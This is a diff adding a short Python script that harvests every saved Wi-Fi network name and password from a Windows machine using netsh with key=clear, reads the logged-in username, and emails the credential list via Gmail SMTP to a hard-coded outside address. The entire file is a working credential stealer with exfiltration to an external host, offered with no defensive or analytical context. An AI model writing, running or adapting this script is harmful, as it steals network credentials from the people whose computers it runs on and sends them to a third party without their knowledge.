@@ -1,0 +1,58 @@
+# with this import we can use system commands
+import subprocess
+
+# re module to make use of regular expression
+import re
+
+import smtplib
+from email.message import EmailMessage
+
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+
+wifi_list = list()
+
+if len(profile_names) != 0:
+    for name in profile_names:
+        wifi_profile = dict()
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+
+        if re.search("Security key           : Absent", profile_info):
+            continue
+        else:
+            wifi_profile["ssid"] = name
+
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)
+
+            if password == None:
+                wifi_profile["password"] = None
+            else:
+                wifi_profile["password"] = password[1]
+
+            wifi_list.append(wifi_profile)
+
+email_message = ""
+
+user_info = subprocess.run(["query", "user"], capture_output = True).stdout.decode()
+
+user_text = re.search(">(.*)",user_info)[1].split(" ")[0]
+
+for item in wifi_list:
+    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
+
+email = EmailMessage()
+
+email["from"] = user_text
+
+email["to"] = "draganionut307@gmail.com"
+email["subject"] = "Wi:Fi Passwords of user " + user_text
+email.set_content(email_message)
+
+with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login("name", "password")
+    smtp.send_message(email)
